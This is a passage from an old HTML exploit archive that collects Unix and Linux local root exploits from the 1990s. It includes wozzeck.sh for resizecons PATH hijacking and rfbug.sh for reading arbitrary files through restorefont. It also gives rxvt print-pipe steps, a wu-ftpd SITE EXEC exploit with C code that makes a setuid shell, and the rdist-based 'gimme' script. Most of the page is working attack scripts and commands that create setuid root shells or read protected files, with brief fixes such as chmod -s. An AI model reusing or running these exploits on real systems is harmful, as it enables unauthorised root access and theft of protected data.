execution. <BR><BR>Solution: <BR>Remove&nbsp; setuid&nbsp; bits&nbsp; of&nbsp; 
killmouse/startmouse.&nbsp; Better yet - nuke them. <BR>While your at it, nuke 
Doom too - it's a stupid game anyway :-) <BR><BR>Best regards, 
<BR>&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp; 
Bo (bo@ebony.iaehv.nl) <BR><BR><BR>killmouse exploit <BR>------------------ cut 
here <BR><BR>/usr/games/doom/startmouse.sh: <BR>#!/bin/sh <BR>if [ -r 
/tmp/gpmkilled ]; then <BR>&nbsp; /usr/bin/grep gpm /etc/rc.d/rc.local &gt; 
/tmp/gpmscript <BR>&nbsp; /bin/sh /tmp/gpmscript; /bin/rm /tmp/gpmscript 
/tmp/gpmkilled <BR>fi <BR><BR>/usr/games/doom/killmouse.sh: <BR>#!/bin/sh <BR>if 
/bin/ps ax | /usr/bin/grep -v grep | /usr/bin/grep "gpm" ; then <BR>&nbsp; 
GPM_RUNNING=true; /bin/killall gpm; /bin/touch /tmp/gpmkilled <BR>fi 
<BR><BR>----------- cut here <BR><BR><A name=12></A><B><FONT size=+1>Root 
Exploit For Resize Icons</FONT></B>&nbsp; <BR><BR>There is a security hole in 
RedHat 2.1, which installs the program <BR>/usr/bin/resizecons suid root.&nbsp; 
The resizecons program allows a user <BR>to change the videmode of the 
console.&nbsp; During this process, it runs <BR>the program restoretextmode 
without an absolute pathname, assuming the <BR>correct version will be found in 
the path, while running with root <BR>privileges.&nbsp; It then executes setfont 
in the same manner.&nbsp; By setting <BR>the path to find a rogue 
restoretextmode, a user can execute an arbitrary <BR>program as root. <BR><BR>As 
a more amusing aside, the file /tmp/selection.pid is read and the <BR>pid 
contained within is sent a SIGWINCH, allowing a user on the system <BR>to force 
a redraw of the screen to an arbitrary process (that handles <BR>SIGWINCH calls) 
on the machine. <BR><BR>If /usr/bin/resizecons needs to be run by users other 
than root at the <BR>console, provisions need to be made in the code to execute 
the outside <BR>utilities with absolute pathnames, and to check access rights on 
files <BR>before opening. 
<BR><BR>&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp; 
Program: /usr/bin/resizecons <BR>Affected Operating Systems: Red Hat 2.1 linux 
distribution 
<BR>&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp; 
Requirements: account on system 
<BR>&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp; Temporary 
Patch: chmod -s /usr/bin/resizecons <BR>&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp; 
Security Compromise: root 
<BR>&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp; 
Author: Dave M. (davem@cmu.edu) 
<BR>&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp; 
Synopsis: resizecons runs restoretextmode without an 
<BR>&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp; 
absolute pathname while executing as root, 
<BR>&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp; 
allowing a user to substitute the real 
<BR>&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp; 
program with arbitrary commands. <BR><BR><BR>----------cut here <BR>wozzeck.sh: 
<BR>#!/bin/sh <BR># <BR># wozzeck.sh <BR># exploits a security hole in 
/usr/bin/resizecons <BR># to create a suid root shell in /tmp/wozz on a <BR># 
linux Red Hat 2.1 system. <BR># <BR># by Dave M. (davem@cmu.edu) <BR># <BR>echo 
================ wozzeck.sh - gain root on Linux Red Hat 2.1 system <BR>echo 
================ Checking system vulnerability <BR>if test -u 
/usr/bin/resizecons <BR>then <BR>echo ++++++++++++++++ System appears 
vulnerable. <BR>cd /tmp <BR>cat &lt;&lt; _EOF_ &gt; /tmp/313x37 <BR>This exploit 
is dedicated to <BR>Wozz.&nbsp; Use it with care. <BR>_EOF_ <BR>cat &lt;&lt; 
_EOF_ &gt; /tmp/restoretextmode <BR>#!/bin/sh <BR>/bin/cp /bin/sh /tmp/wozz 
<BR>/bin/chmod 4777 /tmp/wozz <BR>_EOF_ <BR>/bin/chmod +x /tmp/restoretextmode 
<BR>PATH=/tmp <BR>echo ================ Executing resizecons 
<BR>/usr/bin/resizecons 313x37 <BR>/bin/rm /tmp/restoretextmode <BR>/bin/rm 
/tmp/313x37 <BR>if test -u /tmp/wozz <BR>then <BR>echo ++++++++++++++++ Exploit 
successful, suid shell located in /tmp/wozz <BR>else <BR>echo ---------------- 
Exploit failed <BR>fi <BR>else <BR>echo ---------------- This machine does not 
appear to be vulnerable. <BR>fi <BR><BR>-------------- cut here <BR><BR><A 
name=13></A><B><FONT size=+1>Root Console Exploit For 
restorefont</FONT></B>&nbsp; <BR><BR>Linux 'restorefont' Security Holes <BR>by 
FEH Staff <BR><BR>Linux's svgalib utilities, required to be suid root, have a 
problem in that <BR>they do not revoke suid permissions before reading a 
file.&nbsp; This is exploited <BR>in the restorefont utility, but similar bugs 
exist in other svgalib utilities. <BR>The restorefont utility serves two 
functions.&nbsp; First, it will read a font from <BR>a file and write it to the 
console as the font.&nbsp; Second, it will read a font <BR>from the console and 
write it out to a file.&nbsp; Luckily, the specific bug <BR>in restorefont can 
only be exploited if someone is at the console, reducing <BR>its overall impact 
on the security of the system as a whole. <BR><BR>In writing the utilities, the 
authors are cognizant of the fact that when <BR>writing out the font, suid 
permissions must first be given up; it is in fact <BR>commented as such in the 
code.&nbsp; However, when reading in a font, the program <BR>is still running 
with full suid root permissions.&nbsp; This allows us to read in <BR>any file 
for the font that root could access (basically, anything). <BR><BR>The 
applicable code to read in the file is shown below: <BR><BR>#define FONT_SIZE 
8192 <BR>unsigned char font[FONT_SIZE]; <BR><BR>&nbsp;if (argv[1][1] == 'r') { 
<BR>&nbsp; FILE *f; <BR>&nbsp; f = fopen(argv[2], "rb"); <BR>&nbsp; if (f == 
NULL) { <BR>&nbsp;&nbsp; error: <BR>&nbsp;&nbsp; perror("restorefont"); 
<BR>&nbsp;&nbsp; exit(1); <BR>&nbsp; } <BR>&nbsp; if(1!=fread(font, FONT_SIZE, 
1, f)) <BR>&nbsp;&nbsp; { <BR>&nbsp;&nbsp; if(errno) <BR>&nbsp;&nbsp;&nbsp; goto 
error; <BR>&nbsp;&nbsp; puts("restorefont: input file corrupted."); 
<BR>&nbsp;&nbsp; exit(1); <BR>&nbsp;&nbsp; } <BR>&nbsp; fclose(f); <BR><BR>We 
can see from this that the file to be read in has to be at least 8k, <BR>as if 
it is not, the program will produce an error and exit.&nbsp; If the file <BR>is 
at least 8k, the first 8k are read into the buffer, and the program <BR>proceeds 
to set whatever the contents of the file are to the font: 
<BR>&nbsp;vga_disabledriverreport(); <BR>&nbsp;vga_setchipset(VGA);&nbsp; /* 
avoid SVGA detection */ <BR>&nbsp;vga_init(); 
<BR>&nbsp;vga_setmode(G640x350x16); <BR>&nbsp;vga_puttextfont(font); 
<BR>&nbsp;vga_setmode(TEXT); <BR><BR>At this point, the console will now look 
quite unreadable if you are <BR>reading something other than a font from that 
file.&nbsp; But, the data that <BR>is put into the font is left untouched and is 
readable using the -w option <BR>of restorefont.&nbsp; We then read the font 
back from video memory to a new file, <BR>and our job is complete, we have read 
the first 8k of a file we shouldn't <BR>have had access to.&nbsp; To prevent 
detection of having run this, we probably <BR>shouldn't leave an unreadable font 
on the screen, so we save and then restore <BR>the original font before reading 
from the file. <BR>The complete exploit is shown below: 
<BR><BR>&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp; 
Program: restorefont, a svgalib utility <BR>Affected Operating Systems: linux 
<BR>&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp; 
Requirements: logged in at console <BR>&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp; 
Security Compromise: user can read first 8k of any file of at least 
<BR>&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp; 
8k in size on local filesystems 
<BR>&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp; 
Synopsis: restorefont reads a font file while suid root, 
<BR>&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp; 
writing it to video memory as the current vga 
<BR>&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp; 
font; anyone at console can read the current 
<BR>&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp; 
font to a file, allowing you to use video memory 
<BR>&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp; 
as an 8k file buffer. <BR><BR>------------- <BR>rfbug.sh: 
<BR>--------------------cut here <BR>#!/bin/sh <BR>restorefont -w 
/tmp/deffont.tmp <BR>restorefont -r $1 <BR>restorefont -w $2 <BR>restorefont -r 
/tmp/deffont.tmp <BR>rm -f /tmp/deffont.tmp 
<BR>-----------------------------------cut here <BR><BR><A name=14></A><B><FONT 
size=+1>Root rxvt X Server Exploit</FONT></B>&nbsp; <BR><BR>Program: rxvt 
<BR>Affected Operating Systems: Linux Slackware 3.0, RedHat 2.1, others with 
<BR>&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp; 
rxvt suid root (and compiled with PRINT_PIPE) 
<BR>&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp; 
Requirements: account on system, X server 
<BR>&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp; Temporary 
Patch: chmod -s /usr/X11R6/bin/rxvt <BR>&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp; 
Security Compromise: root 
<BR>&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp; 
Author: Dave M. (davem@cmu.edu) 
<BR>&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp; 
Synopsis: rxvt fails to give up root privileges before 
<BR>&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp; 
opening a pipe to a program that can be specified 
<BR>&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp; 
by the user. <BR><BR><BR>Exploit: <BR>1.&nbsp; Set DISPLAY environment variable 
if necessary so you can use x clients. <BR>2.&nbsp; In user shell: 
<BR>&nbsp;&nbsp;&nbsp; $ echo 'cp /bin/sh /tmp/rxsh;chmod 4755 /tmp/rxsh' &gt; 
/tmp/rxbug <BR>&nbsp;&nbsp;&nbsp; $ chmod +x /tmp/rxbug <BR>&nbsp;&nbsp;&nbsp; $ 
rxvt -print-pipe /tmp/rxbug <BR>3.&nbsp; In rxvt xclient: <BR>&nbsp;&nbsp;&nbsp; 
$ cat <BR>&nbsp;&nbsp;&nbsp;&nbsp;&nbsp; ESC[5i 
<BR>&nbsp;&nbsp;&nbsp;&nbsp;&nbsp; ESC[4i <BR>&nbsp;&nbsp;&nbsp; (The client 
will close at this point with a broken pipe) <BR>4.&nbsp; $ /tmp/rxsh 
<BR>&nbsp;&nbsp;&nbsp; # whoami <BR>&nbsp;&nbsp;&nbsp; root 
<BR>&nbsp;&nbsp;&nbsp; # <BR><BR><A name=15></A><B><FONT size=+1>Root wuftpd 
Exploit</FONT></B>&nbsp; <BR><BR>The following is gleaned from the BugTraq 
mailing list: <BR>------------------------------------------------------- 
<BR>Since Bugtraq is exceptionally quiet lately, I though I should make it 
<BR>come alive again with this discussion of the bug that was reported in 
<BR>the wu.ftpd that comes with some Slackware distributions of Linux. <BR>The 
report was just before Bugtraq went down for a long time, but <BR>I've found the 
bug still to be present on all the Linux machines that <BR>I have access to. So 
maybe it needs to be brought a little more in <BR>the open. Here we go: 
<BR><BR>ObBug: - Short description of the bug <BR><BR>It involves wu.ftpd being 
misconfigured at compile time and allowing <BR>SITE EXEC access to /bin (for 
anonymous or otherwise chroot-ed users <BR>this is ~ftp/bin). Now if in this 
/bin resides a program that gives <BR>access to executables outside /bin, but in 
the users reach (such as <BR>/bin/bash that gives access to the user's homedir), 
this opens up <BR>a root vulnerability. This should have been set to 
/bin/ftp-exec and <BR>which be set by the _PATH_EXECPATH variable in 
src/pathnames.h before <BR>compiling. The wu-ftpd-2.4_linux.tgz that I found 
somewhere on the <BR>net has this securely set as default value. <BR><BR>- How 
to check ? <BR><BR>$ ftp -n localhost <BR>user: &lt;userid&gt; <BR>password: 
&lt;passwd&gt; <BR>ftp&gt; quote site exec bash -c id <BR><BR>If vulnerable it 
gives here: uid=0, gid=0, euid=&lt;yourid&gt;, egid=&lt;your-gids&gt; <BR><BR>Of 
course, bash should not be available at all <BR><BR>- How to exploit (in case 
your sysadmin or you think the above is not <BR>&nbsp; a problem) <BR><BR>go to 
your homedir and make a program: duh.c (or whatever) <BR><BR>main() { 
<BR>&nbsp;&nbsp; seteuid(0); <BR>&nbsp;&nbsp; setegid(0); <BR>&nbsp;&nbsp; 
system("/bin/cp /bin/sh ./sh"); <BR>&nbsp;&nbsp; system("/bin/chmod 6755 ./sh"); 
<BR>} <BR><BR>$ make duh <BR>$ ftp -n localhost (and login) <BR>user: 
&lt;userid&gt; <BR>password: &lt;passwd&gt; <BR>ftp&gt; quote site exec bash -c 
duh <BR>ftp&gt; quit <BR><BR>$ ./sh <BR><BR>bash# <BR><BR>(voila, QED) <BR><BR>- 
How to fix? <BR><BR>Get the source of wu-ftpd-2.4.linux.tar.gz (stock 
wu-ftpd-2.4 from wuarchive <BR>doesn't compile on linux) and compile it; you 
might want to define the <BR>_PATH_PIDNAMES and _PATH_XFERLOG to other values 
there...(/usr/adm/ftp.pids-%s <BR>and /usr/adm/xferlog for example). If you 
cannot find that I can email the <BR>source to you,...if you trust the source I 
took somewhere unmodified and <BR>if you trust me ;-) An arch search for 
wu-ftpd-2.4 will give you sites too. <BR>I can remember that I got it that way. 
<BR><BR>$) Henri Karrenbeld 
<BR>----------------------------------------------------------------------------- 
<BR>Hardware, n.: <BR>&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp; The parts of a 
computer system that can be kicked. 
<BR>----------------------------------------------------------------------------- 
<BR><BR><A name=16></A><B><FONT size=+1>A Shell Script Called gimme, Used To 
Read Any System File</FONT></B>&nbsp; <BR><BR><BR>----------------cut here 
<BR>#! /bin/sh <BR># GIMME - "gimme' a file" <BR># Demonstrate rdist's ability 
to give me permission to access anything. <BR># <BR># gimme &lt;pathname&gt; 
[&lt;permission&gt; [&lt;directory&gt;]] 
<BR>#&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp; &lt;pathname&gt; is the target file. 
<BR>#&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp; &lt;permission&gt; is the octal mode 
to which the file access permission 
<BR>#&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp; 
should be set.&nbsp; Note that this may not be effective unless 
<BR>#&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp; 
either the SUID (4000) or SGID (2000) bits are also requested. 
<BR>#&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp; &lt;directory&gt; is the target 
directory for rdist to use if a hard 
<BR>#&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp; 
link is desired.&nbsp; Note that the user must have permission 
<BR>#&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp; 
to create this directory, it must be on the same filesystem 
<BR>#&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp; 
as the target file, and the target file must not be a 
<BR>#&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp; 
directory.&nbsp; This option is necessary to change the ownership 
<BR>#&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp; 
of the target if chown() of a symbolic link modifies the 
<BR>#&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp; 
link itself, and not the file it refers to. <BR># <BR><BR>dirname=gimme$$ 
<BR>deftemp=/tmp <BR>defperm=6777 <BR><BR>if [ $1x = x ]; then 
<BR>&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp; echo "Usage: $0 &lt;pathname&gt; 
[&lt;permission&gt; [&lt;directory&gt;]]" &gt;&amp;2 
<BR>&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp; exit 1 <BR>fi <BR><BR>if [ $2x != 
x ]; then <BR>&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp; perm=$2 <BR>else 
<BR>&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp; perm=$defperm <BR>fi <BR><BR>if [ 
$3x != x ]; then <BR>&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp; link="ln" 
<BR>&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp; temp=$3/$dirname 
<BR>&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp; target=$1 <BR>else 
<BR>&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp; link="ln -s" 
<BR>&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp; temp=$deftemp/$dirname 
<BR>&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp; case $1 in 
<BR>&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp; /*) 
<BR>&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp; 
target=$1 
<BR>&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp; 
;; <BR>&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp; *) 
<BR>&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp; 
target=`pwd`/$1 
<BR>&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp; 
;; <BR>&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp; esac <BR>fi <BR><BR>trap "rm 
-fr $temp; exit 1"&nbsp; 1 2 15 <BR>umask 66 <BR>mkdir $temp; if [ $? != 0 ]; 
then <BR>&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp; exit 1 <BR>fi <BR><BR>set 
`whoami` $LOGNAME <BR>user=$1 <BR>set daemon `groups` <BR>while [ $# != 1 ]; do 
<BR>&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp; shift <BR>done <BR>group=$1 
<BR><BR>( <BR>&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp; echo "t$temp/something" 
<BR>&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp; echo "R0 $perm 1 0 $user $group " 
<BR><BR>&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp; while [ ! -f $temp/rdist* ]; 
do 
<BR>&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp; 
sleep 1 <BR>&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp; done 
<BR><BR>&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp; set $temp/rdist* 
<BR>&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp; rm -f $1 
<BR>&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp; if $link $target $1 &gt;&amp;2; 
then 
<BR>&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp; 
echo "" | dd bs=3 conv=sync 2&gt;/dev/null 
<BR>&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp; 
echo "" 
<BR><BR>&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp; 
echo 0 &gt; $temp/status <BR>&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp; else 
<BR>&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp; 
echo 1 &gt; $temp/status <BR>&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp; fi 
<BR><BR>&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp; exit <BR>) | rdist -Server 
<BR><BR>status=`cat $temp/status` <BR>rm -fr $temp <BR>exit $status 
<BR>-----------------------------cut here <BR>
<CENTER><A href="http://www.atomicfrog.com/archives/">Back to 
Index</A></CENTER></BODY></HTML>
